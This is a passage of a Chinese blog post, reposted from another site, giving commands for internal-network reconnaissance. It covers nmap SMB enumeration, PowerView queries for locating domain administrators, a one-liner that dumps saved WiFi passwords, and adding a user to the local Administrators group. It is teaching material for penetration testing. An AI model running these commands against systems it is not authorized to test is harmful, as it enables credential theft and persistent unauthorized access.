<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap --script=smb-enum-sessions 192.168.1.1</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">脚本</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">smb-enum-domains</td>
<td align="center">尝试枚举系统上的域及其策略</td>
</tr>
<tr>
<td align="center">smb-enum-users</td>
<td align="center">枚举远程Windows系统上的用户，并提供尽可能多的信息</td>
</tr>
<tr>
<td align="center">smb-enum-shares</td>
<td align="center">便利远程主机共享目录</td>
</tr>
<tr>
<td align="center">smb-enum-processes</td>
<td align="center">通过SMB从远程服务器提取进程列表，可以知道目标主机运行哪些软件。需要管理员权限</td>
</tr>
<tr>
<td align="center">smb-enum-sessions</td>
<td align="center">枚举在本地或通过SMB共享登录到系统的用户</td>
</tr>
<tr>
<td align="center">smb-os-discovery</td>
<td align="center">尝试通过SMB协议（端口445或139）确定操作系统，计算机名称，域，工作组和当前时间。</td>
</tr>
</tbody></table>
<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><blockquote>
<p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView" target="_blank" rel="noopener">PowerView</a>是一款依赖powershell和WMI对内网进行查询的常用渗透测试脚本，集成在powersploit工具包中，是一个收集域信息很好用的脚本。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 定位域管理员</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> powershell.exe -<span class="built_in">exec</span> bypass -c <span class="string">"Import-Module C:\PowerView.ps1; Invoke-UserHunter"</span></span></span><br></pre></td></tr></table></figure>





<h2 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h2><blockquote>
<p>一个典型的域权限提升过程，通常围绕着<strong>收集明文凭据</strong>或<strong>通过<code>Mimikatz</code>提权</strong>等方法。在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tasklist /v                             <span class="comment"># 列出本机的所有进程及进程用户</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"Domain Admins"</span> /domain       <span class="comment"># 获取域管理员列表</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"Domain Controllers"</span> /domain  <span class="comment"># 查询域控制器列表</span></span></span><br></pre></td></tr></table></figure>





<h2 id="Powershell收集信息"><a href="#Powershell收集信息" class="headerlink" title="Powershell收集信息"></a>Powershell收集信息</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">Get-ExecutionPolicy</span>               <span class="comment"># 查看执行策略</span></span><br><span class="line"><span class="variable">$</span> <span class="built_in">Set-ExecutionPolicy</span> Unrestricted  <span class="comment"># 修改执行策略(需管理员权限)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用PowerView</span></span><br><span class="line"><span class="variable">$</span> <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">Get-NetDomain</span>            <span class="comment"># 获取当前用户所在域的名称</span></span><br><span class="line"><span class="built_in">Get-NetUser</span>              <span class="comment"># 获取所有用户的详细信息</span></span><br><span class="line"><span class="built_in">Get-NetComputer</span>          <span class="comment"># 获取域内所有机器的详细信息</span></span><br><span class="line"><span class="built_in">Get-NetShare</span>             <span class="comment"># 获取当前域内所有的共享信息</span></span><br><span class="line"><span class="built_in">Get-ADObject</span>             <span class="comment"># 获取活动目录的对象（内容超级多）</span></span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>        <span class="comment"># 获取域用户登陆的计算机信息，以及该用户是否有本地管理员权限</span></span><br><span class="line"><span class="built_in">Invoke-ProcessHunter</span>     <span class="comment"># 通过查询域内所有的机器进程找到特定用户</span></span><br></pre></td></tr></table></figure>



<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>用户信息<ul>
<li>权限：<code>system &gt; administrator &gt; user</code></li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net user /domain                        <span class="comment"># 查看域用户</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"domain admins"</span> /domain       <span class="comment"># 查看域管理员</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"domain controllers"</span> /domain  <span class="comment"># 查看域控制器</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nltest /domain_trusts  <span class="comment"># 查看域信任</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 其它</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> query user                                 <span class="comment"># 查看在线用户</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net user                                   <span class="comment"># 查看全部用户</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net user naraku                            <span class="comment"># 查看指定用户: net user &lt;username&gt; </span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net user naraku pwd123. /add               <span class="comment"># 添加用户,默认Users组: net user &lt;username&gt; &lt;password&gt;  /add    </span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net localgroup administrators naraku /add  <span class="comment"># 添加到Administrators组: net localgroup administrators &lt;username&gt; /add</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看wifi密码</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">for</span> /f <span class="string">"skip=9 tokens=1,2 delims=:"</span> %i <span class="keyword">in</span> (<span class="string">'netsh wlan show profiles'</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</span></span><br></pre></td></tr></table></figure>



<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>转载自<a href="https://www.naraku.cn/posts/90.html" target="_blank" rel="noopener">https://www.naraku.cn/posts/90.html</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">我是小吴啦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">http://yoursite.com/2020/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/05/25/CVE-2020-9484-Tomcat-cluster-sync-session-%E5%A4%8D%E7%8E%B0/"><i class="fa fa-chevron-left">  </i><span>CVE-2020-9484(Tomcat cluster sync-session)复现</span></a></div><div class="next-post pull-right"><a href="/2020/05/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span>内网渗透之基础知识</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By 我是小吴啦</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>